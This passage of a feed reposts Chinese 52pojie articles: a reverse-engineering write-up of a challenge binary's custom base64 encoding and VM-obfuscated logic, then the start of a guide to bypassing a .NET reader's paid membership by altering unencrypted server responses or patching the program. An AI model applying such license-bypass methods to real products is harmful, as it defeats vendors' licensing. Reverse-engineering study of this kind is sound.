src="https://wechat2rss.xlab.app/img-proxy/?k=be4876ee&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBLFxqd5O6er8zATJ6dkgF0ALC5JfsibXC53jagvdFAaOyKiaUyfCNQtNw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /><span></span><br /><span>好熟悉的字符串，这不正是初赛题的明文嘛，这个明显就是base64加密明文了，但是还有一个疑问，就是不同的文件会打印出不同的密文，把十六个文件的密文提取出来对比一下</span></p><p><br /></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 115, 253);">1</span> <span style="color: rgb(168, 255, 96);">F2FU4Wht52lm+2dV4WFu</span> <span style="color: rgb(255, 115, 253);">6128</span><br /><span style="color: rgb(255, 115, 253);">2</span> <span style="color: rgb(168, 255, 96);">4WECF2ht52lm+2dV4WFu</span> <span style="color: rgb(255, 115, 253);">20512</span><br /><span style="color: rgb(255, 115, 253);">2</span> <span style="color: rgb(168, 255, 96);">4WECF2ht52lm+2dV4WFu</span> <span style="color: rgb(255, 115, 253);">22060</span><br /><span style="color: rgb(255, 115, 253);">3</span> <span style="color: rgb(168, 255, 96);">Fx9U4RY7ERcwDRkDFx84</span> <span style="color: rgb(255, 115, 253);">22708</span><br /><span style="color: rgb(255, 115, 253);">4</span> <span style="color: rgb(168, 255, 96);">Fx8CFxY7ERcwDRkD4WFu</span> <span style="color: rgb(255, 115, 253);">25296</span><br /><span style="color: rgb(255, 115, 253);">5</span> <span style="color: rgb(168, 255, 96);">Fx9U4RZt5xcwDRkDFx84</span> <span style="color: rgb(255, 115, 253);">25376</span><br /><span style="color: rgb(255, 115, 253);">6</span> <span style="color: rgb(168, 255, 96);">Fx8CFxY7ERcwDRkDFx84</span> <span style="color: rgb(255, 115, 253);">25620</span><br /><span style="color: rgb(255, 115, 253);">3</span> <span style="color: rgb(168, 255, 96);">Fx9U4RY7ERcwDRkDFx84</span> <span style="color: rgb(255, 115, 253);">25756</span><br /><span style="color: rgb(255, 115, 253);">2</span> <span style="color: rgb(168, 255, 96);">4WECF2ht52lm+2dV4WFu</span> <span style="color: rgb(255, 115, 253);">26136</span><br /><span style="color: rgb(255, 115, 253);">3</span> <span style="color: rgb(168, 255, 96);">Fx9U4RY7ERcwDRkDFx84</span> <span style="color: rgb(255, 115, 253);">27704</span><br /><span style="color: rgb(255, 115, 253);">7</span> <span style="color: rgb(168, 255, 96);">4R9U4RY7ERcwDWdV4WE4</span> <span style="color: rgb(255, 115, 253);">27976</span><br /><span style="color: rgb(255, 115, 253);">8</span> <span style="color: rgb(168, 255, 96);">4WECF2ht5xcwDRkDFx84</span> <span style="color: rgb(255, 115, 253);">28380</span><br /><span style="color: rgb(255, 115, 253);">3</span> <span style="color: rgb(168, 255, 96);">Fx9U4RY7ERcwDRkDFx84</span> <span style="color: rgb(255, 115, 253);">28624</span><br /><span style="color: rgb(255, 115, 253);">9</span> <span style="color: rgb(168, 255, 96);">Fx9U4RY7EWlm+xkDFx84</span> <span style="color: rgb(255, 115, 253);">28764</span><br /><span style="color: rgb(255, 115, 253);">10</span> <span style="color: rgb(168, 255, 96);">4WECFxY7ERcwDWdV4WFu</span> <span style="color: rgb(255, 115, 253);">29904</span><br /><span style="color: rgb(255, 115, 253);">11</span> <span style="color: rgb(168, 255, 96);">Fx9U4RY7ERcwDWdV4WE4</span> <span style="color: rgb(255, 115, 253);">31648</span></code></pre><p>对比发现十六个线程有十一个密文，16:11的不规则性我觉得甚至不止十一个，因为这个采样只是采取了一个进程创建的十六个线程，如果有更多进程可能就意味着更多种密文。</p><p>根据base64编码规则，如果码表和明文都一致的话，那密文就只能有一个，说明每个线程的码表和明文至少有一个不一致。那现在只能继续分析他的加密方式，在现有的码表处下断追踪到加密函数</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=ca5c6d36&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYB6BFJ4Cz1YKXy5LOYgnJGpnVtpY4vYibLpNRDgYiafkibczibHARPkaiaUWg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>在内存窗口发现传入的第一个参数是一个字符串地址-&gt;c tc me an，貌似跟catchmeifyoucan明文很像，所以这是修改了明文，然后再通过正常的码表进行base64加密？提取出这个明文，试一下对着这个码表加密，对比运行后的密文就知道了，</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">明文：<span style="color: rgb(255, 115, 253);">0x15</span>, <span style="color: rgb(255, 115, 253);">0x61</span>, <span style="color: rgb(255, 115, 253);">0x02</span>, <span style="color: rgb(255, 115, 253);">0x15</span>, <span style="color: rgb(255, 115, 253);">0x68</span>, <span style="color: rgb(255, 115, 253);">0x1B</span>, <span style="color: rgb(255, 115, 253);">0x13</span>, <span style="color: rgb(255, 115, 253);">0x69</span>, <span style="color: rgb(255, 115, 253);">0x66</span>, <span style="color: rgb(255, 115, 253);">0x79</span>, <span style="color: rgb(255, 115, 253);">0x6F</span>, <span style="color: rgb(255, 115, 253);">0x75</span>, <span style="color: rgb(255, 115, 253);">0x63</span>, <span style="color: rgb(255, 115, 253);">0x17</span>, <span style="color: rgb(255, 115, 253);">0x18</span>实际密文：F2ECF2g7EWlm+2dV4R84正常base64密文：F2ECF2g7EWlm+2dV4R84<br />明文：<span style="color: rgb(255, 115, 253);">0x63</span>, <span style="color: rgb(255, 115, 253);">0x17</span>, <span style="color: rgb(255, 115, 253);">0x74</span>, <span style="color: rgb(255, 115, 253);">0x63</span>, <span style="color: rgb(255, 115, 253);">0x1E</span>, <span style="color: rgb(255, 115, 253);">0x6D</span>, <span style="color: rgb(255, 115, 253);">0x65</span>, <span style="color: rgb(255, 115, 253);">0x1F</span>, <span style="color: rgb(255, 115, 253);">0x10</span>, <span style="color: rgb(255, 115, 253);">0x0F</span>, <span style="color: rgb(255, 115, 253);">0x19</span>, <span style="color: rgb(255, 115, 253);">0x03</span>, <span style="color: rgb(255, 115, 253);">0x15</span>, <span style="color: rgb(255, 115, 253);">0x61</span>, <span style="color: rgb(255, 115, 253);">0x6E</span>实际密文：4R9U4RZt5xcwDRkDF2Fu<br />正常base64密文：4R9U4RZt5xcwDRkDF2Fu</code></pre><p>对比了多组，确信了码表是对的<code style="font-family: SFMono-Regular, Consolas, ;">ABCDEFGHIJKLMNOPwxyz0123456789+/ghijklmnopqrstuvQRSTUVWXYZabcdef</code>,但是调试这个加密的过程中发现，一个线程至少会有两组明文，上面就是出自同一个线程。并且这个函数加密后的密文跟实际文件密文不同，下面是提取的两组密文和实际文件密文</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">//34288线程</span><br />文件密文：<span style="color: rgb(255, 115, 253);">4</span>WFU4Wht52lm+<span style="color: rgb(255, 115, 253);">2</span>dV4WFu<br />密文<span style="color: rgb(255, 115, 253);">1</span>   ：Fx8C4Wg7ERcwDWdV4WE4<br />密文<span style="color: rgb(255, 115, 253);">2</span>   ：<span style="color: rgb(255, 115, 253);">4</span>WFUFxZt52lm+xkDFx9u</code></pre><p>现在还有很多问题在里面，首先是明文为什么一个线程有两组，加密得到的两组密文跟文件密文有什么关系？两组密文实在是太奇怪了，我试着把他们联系起来，于是我将两组密文用base64还原得到明文也进行了对比，发现了一个惊喜。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=44d2ad74&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBdCHrlnvY0ibNrYL1mrbdavFY8VRoYQGPKtYBYQebkW1sXFaVtmLdxPw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="679" /></p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=3a512cfc&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBj7iaF0jHzJvHXGnAXia3zUtq3HHmMvm5jWRut7ibov4hib0ErXRib6mKMCQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="669" /><span></span></p><p><br /></p><p>这两个明文的有效字符组合起来刚好是catchmeifyoucan！！！ 接着就是其他无效字符了，提取出十六进制看看有没有联系</p><p>Fx8C4Wg7ERcwDWdV4WE4-&gt;<span style="font-weight: 700;">0x15</span>,<span style="font-weight: 700;">0x17</span>,<span style="font-weight: 700;">0x02</span>,0x63,0x68,<span style="font-weight: 700;">0x1b</span>,<span style="font-weight: 700;">0x13</span>,<span style="font-weight: 700;">0x1f</span>,<span style="font-weight: 700;">0x10</span>,<span style="font-weight: 700;">0x0f</span>,0x6f,0x75,0x63,0x61,<span style="font-weight: 700;">0x18</span><br />4WFUFxZt52lm+xkDFx9u-&gt;0x63,0x61,0x74,<span style="font-weight: 700;">0x15</span>,<span style="font-weight: 700;">0x1e</span>,0x6d,0x65,0x69,0x66,0x79,<span style="font-weight: 700;">0x19</span>,<span style="font-weight: 700;">0x03</span>,<span style="font-weight: 700;">0x15</span>,<span style="font-weight: 700;">0x17</span>,0x6e</p><p>貌似没什么关系，考虑到多个文件的写入密文不同，继续提取其他线程的密文</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">//14032 线程</span>文件密文：Fx8CFxY7ERcwDRkDFx84<br />密文<span style="color: rgb(255, 115, 253);">1</span>   ：Fx8C4Wg7ERcwDWdV4WE4<br />密文<span style="color: rgb(255, 115, 253);">2</span>   ：<span style="color: rgb(255, 115, 253);">4</span>WFUFxZt52lm+xkDFx9u</code></pre><p>拿这个线程的文件密文拿去解密，得到十六进制数组:<span style="font-weight: 700;">0x15,0x17,0x02,0x15,0x1e,0x1b,0x13,0x1f,0x10,0x0f,0x19,0x03,0x15,0x17,0x18</span>，刚好由34288线程的两组非可视字符十六进制组成。根据这个思路我把之前提取的密文进行了解密，发现线程之间的非字符不一定是成对的，但是非字符的十六进制跟所在索引是一定的，也就是说所有非可视字符的十六进制都是从上面这个数组里取，我试图多运行几遍进程反驳我这个猜想，因为这个十六进制数组并没有什么规律，但是运行结果都显示这个数组是一定的。</p><p>所以现在可以确定的是，明文catchmeifyoucan会和这个数组以某种方式进行混合，最后组成真正的明文进行base64换表加密得到文件密文。现在就需要继续研究这个混合的方式，因为进程会启动十六个线程来写日志，而且在之前的观察中看到在CreateFileA函数之前，密文就已经储存在寄存器中，所以是CreateThread和CreateFileA函数之间进行了明文混合和base64加密，对这三个关键地方下断点调试</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=89de24a9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBYq09MAt7s9ZNUucV68vjOrzkeia3d0gaoGAIGQaWqewgfIGiaERwsY8Q%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">{<br /><span style="color: rgb(255, 115, 253);">0x15</span>, <span style="color: rgb(255, 115, 253);">0x17</span>, <span style="color: rgb(255, 115, 253);">0x02</span>, <span style="color: rgb(255, 115, 253);">0x15</span>, <span style="color: rgb(255, 115, 253);">0x1E</span>, <span style="color: rgb(255, 115, 253);">0x1B</span>, <span style="color: rgb(255, 115, 253);">0x13</span>, <span style="color: rgb(255, 115, 253);">0x1F</span>, <span style="color: rgb(255, 115, 253);">0x10</span>, <span style="color: rgb(255, 115, 253);">0x0F</span>, <span style="color: rgb(255, 115, 253);">0x19</span>, <span style="color: rgb(255, 115, 253);">0x03</span>, <span style="color: rgb(255, 115, 253);">0x15</span>, <span style="color: rgb(255, 115, 253);">0x17</span>, <span style="color: rgb(255, 115, 253);">0x18</span><br />}<span style="color: rgb(146, 255, 184);">;</span></code></pre><p>可以看到，第一个参数即为之前分析的十六进制数组的指针，做一层栈回溯找明文替换方式</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=37ef1090&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBrlX04MYUU1dWSny210uibfe2TMh6fvaNyAoshr2kKb9cpcq6yR25JDw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>对base64的第一个参数位置（明文指针）下硬件访问断点，找到写入明文内存的位置</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=30d0eb6d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBibibZpyibKG4CTrBt6njbHribaUS61XgjENtIbgllGxBLmrveGoOqpMaHQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=8e4b6961&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBqrLFKSsh7Rr1BF14xqM9mH1YavdCkV6OK9S00e1ruKNqnnibdMWia90w%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1076" /><span></span></p><p><br /></p><p>明文进行了一个字节一个字节的写入，仔细看这段VM给的混淆汇编代码， 其实就是一个</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">mov</span> r8, qword ptr ds:[rdi]<br /><span style="color: rgb(150, 203, 254);">mov</span> r9b, byte ptr ds:[rdi+<span style="color: rgb(255, 115, 253);">0x8</span>]<br /><span style="color: rgb(150, 203, 254);">mov</span> byte ptr ds:[r8], r9b</code></pre><p>那就意味着我们要追踪[RDI]看看是怎么来的，由于这段代码已经被VM了，控制流混淆导致根本没法手动追踪，用xdbg自动追踪功能打印日志看看</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=eba6d673&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBUUiaoiclQthHLDvlk6aXb0jfNct81v4xfxRS2AUono7BouPb7OIjicxgg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="765" /></p><p><br /></p><p>足足有30000行汇编</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=4b572739&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYB41QWpOfesibI21B3fLkE3X2BdCGfoBia0DWtxNTgV6ogoicWXJObch5mg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="836" /></p><p><br /></p><p>往上回溯第一层发现[rdi]从RFLAGS寄存器来的，如果真要手动回溯的话，就要回溯十多个标志位，手动分析逻辑写源码不大现实（不禁再次感叹VM的强大）</p><p>根据题目要求</p><p><span style="font-weight: 700;">提取WorkingService.exe的主体功能可以以二进制指令块的形式，也可以以自写源码的形式</span></p><p>可以考虑提取二进制指令块的形式写功能，那我们就可以把这段追踪得来的汇编代码转成ShellCode写入到自己程序的内存里，然后通过VirtualProtect修改成可执行的运行一下从而提取这份功能。只要获取这份功能就可以完成第三问了，感觉工程量挺大的就不写了。</p><p>启动程序后会先默认按照参数daemon restart启动一个守护进程，守护进程通过设置参数working和调用ShellExcuteA来启动工作进程，工作进程会创建16个线程来循环调用CreateFileA保持文件存在（第二问需要通过修改参数实现相同功能并减少CPU占用率）并调用一次WriteFile来写入密文，密文由两个明文和两种加密组成，明文是catchmeifyoucan字符串和{0x15, 0x17, 0x02, 0x15, 0x1E, 0x1B, 0x13, 0x1F, 0x10, 0x0F, 0x19, 0x03, 0x15, 0x17, 0x18<br />}数组，第一种加密是某种替换加密，第二种加密是base64变表加密。</p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1954225-1-1.html">阅读原文</a></p>
<p><a href="https://wechat2rss.xlab.app/link-proxy/?k=d6cb26aa&amp;r=1&amp;u=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMjM5Mjc3MDM2Mw%3D%3D%26mid%3D2651141171%26idx%3D1%26sn%3D66f61359150558e0f64a6fce7ef9c39f%26chksm%3Dbd50a4678a272d7172260a5fb31c2a3d6d9c91cf41af1c8ac841206025234832867cf73dd42b%26scene%3D58%26subscene%3D0%23rd">跳转微信打开</a></p>
]]></content:encoded>
<pubDate>Fri, 16 Aug 2024 10:30:50 +0800</pubDate>
<pubDate>Fri, 16 Aug 2024 10:30:50 +0800</pubDate>
</item>

<item>
<title>记录一下一个.Net阅读器的两种破解方式</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141137&amp;idx=1&amp;sn=fb0f616c3a6618e348899a2abee46b83&amp;chksm=bd50a4458a272d535595e3f3d916ce851887a825064d579fc1604e9f079487babe5dde3c181d&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141137&amp;idx=1&amp;sn=fb0f616c3a6618e348899a2abee46b83&amp;chksm=bd50a4458a272d535595e3f3d916ce851887a825064d579fc1604e9f079487babe5dde3c181d&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-08-15 18:30</span> <span style="display: inline-block;">北京</span>
</p>

<p>这个软件分析没花多久，我个人认为这个软件比较简单，很适合新手练手，不管是Patch技巧还是抓包姿势都很适合。但是还是那句话，只做分析讨论，不提供成品，如有需求请支持正版。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=b408056a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIj6XoszrHG8Q6Lic1DbSEwXrdRja3nRp9j1DLB3lWvuaNfIkcGmPfvzjA%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">坛账号：</span>Benx1</strong><br /></p><p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"></strong></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><h2>声明</h2><p>本文章中所有内容仅供研究、学习交流使用，不能用作其他任何目的，严禁用于商业用途和非法用途，否则一切后果自负，与作者无关。您必须在下载后的24个小时之内，从您的电脑中彻底删除上述内容。如果您喜欢该程序，请支持正版软件，购买注册，得到更好的正版服务。如有侵权请发送邮件Service@52pojie.cn联系论坛管理员删除文章</p><blockquote><p style="margin-bottom: 15px;">XX阅读器133，下载见 aHR0cDovL3JlYWQuaG9tZTEzMy5jb20v</p><p style="margin-bottom: 15px;">原分析帖链接：<a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141093&amp;idx=1&amp;sn=abcba6bfd4b896957c83ae4c64b0669d&amp;chksm=bd50a3b18a272aa751100e480c25700596f784c656649cd7888569066676e5caa7870d09fa63&amp;scene=21#wechat_redirect" target="_blank">‍https://www.52pojie.cn/thread-1949654-1-1.html‍</a></p></blockquote><h2>运行起来看看</h2><p>软件运行起来是个框框，右键这个框框有菜单可以注册，注册之后会提示快到期了。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=a4773d4b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjPMccicOib2OtZCYCNbS0JJGplOl5LNQib5v9ON2h4L64rictH7SVtrDGbA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>右键系统-&gt;会员可以看到会员信息</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=9a972d8b&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjlQomZNz2quSDNLC6FFTsJWGRmEpRFpqavyCabHrXYia5tLUPjnJCpxA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>大概的会员信息都在这里了，下一步</p><h2>拖到DIT里面查壳</h2><p>一眼顶针，C# .Net 有混淆，先不管，直接丢到dnspy看代码</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=6aa1fc6d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjzlw4gbNfI7H5d7e13Tia7LWjytp16V25pFLpbXNZbjasibbAbx8abTRQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><h2>代码分析</h2><p>直接在dnspy里面搜索 “会员”</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=0b6decf3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjcAj3Rkk3YNPLAmXY22nvygO2WDD0TicOj674NNGl90YEibXnpZDycUyg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>可以看到有4个结果，一个个打开看，其实第一条就是我们要找的结果，仔细观察这个函数可以得到两个很关键的点，一个会员状态，一个过期时间，会员状态本身就是个 enum 枚举有3个状态，会员(永久会员)，非会员（期限会员），过期。</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=13c608c7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKQflG9MgmGgF2epvUUMZIjGFWS2RTTyhTSapAM3u2RGDOU6Nk2uVXyRYlSuQ7uVtiadvjyTxzrjHQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>根据代码可以看到，这个状态是联网获取的并且请求和响应没有加密，那这里就有两个方式破解了：</p><ol><li style="margin-left: 2px;"><p>抓包改相应，直接修改</p></li><li style="margin-left: 2px;"><p>patch程序</p></li></ol><h2>分析请求和响应</h2><p>掏出我们的老朋友HttpDbgPro开始分析，先直接开软件，可以看到登录请求，是个GET请求，请求头里面带上了UID，这个UID就是软件界面显示的UID，实际就是用这个UID判断用户的，响应可以看到是明文的</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" 